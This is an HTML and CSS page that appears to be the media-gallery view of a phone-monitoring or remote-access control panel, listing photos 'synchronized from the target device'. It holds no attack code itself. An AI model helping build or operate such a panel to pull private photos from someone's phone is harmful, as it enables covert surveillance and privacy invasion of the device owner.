<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Media Gallery - RS Phone</title>
    <style>
        body { 
            background-color: #121212; 
            color: #ffffff; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            padding-bottom: 30px;
        }
        .container { padding: 20px; max-width: 900px; margin: auto; }
        .header { 
            border-bottom: 1px solid #333; 
            padding-bottom: 15px; 
            margin-bottom: 20px; 
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h2 { margin: 0 0 5px 0; color: #e91e63; text-transform: uppercase; letter-spacing: 1px; }
        .header p { margin: 0; color: #aaa; font-size: 0.9em; }
        .back-link { color: #4caf50; text-decoration: none; font-weight: bold; padding: 8px 12px; background: rgba(76, 175, 80, 0.2); border-radius: 4px; }
        .back-link:hover { background: rgba(76, 175, 80, 0.4); }
        
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .photo-card { 
            background: #1e1e1e; 
            border-radius: 8px; 
            overflow: hidden;
            border: 1px solid #333;
            transition: transform 0.2s;
            position: relative;
        }
        .photo-card:hover { transform: scale(1.02); border-color: #e91e63; }
        
        .photo-img {
            width: 100%;
            height: 250px;
            object-fit: cover;
            display: block;
        }
        
        .photo-meta {
            padding: 10px;
            background: rgba(0, 0, 0, 0.8);
            position: absolute;
            bottom: 0;
            width: 100%;
            box-sizing: border-box;
        }
        .photo-date { color: #aaa; font-size: 0.8em; font-weight: bold; }
        
        #loading-text { color: #888; font-style: italic; text-align: center; margin-top: 50px; }
        
        .empty-state { text-align: center; color: #555; margin-top: 50px; font-size: 1.1em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h2>Rolling Media Gallery</h2>
                <p>Latest 10 synchronized photos from the target device.</p>
            </div>
            <a href="/dashboard" class="back-link">&larr; Dashboard</a>
        </div>
        
        <div id="gallery-container">
            <p id="loading-text">Establishing secure connection... Fetching encrypted media...</p>
        </div>
    </div>

    <script src="/static/js/gallery_engine.js"></script>
</body>
</html>
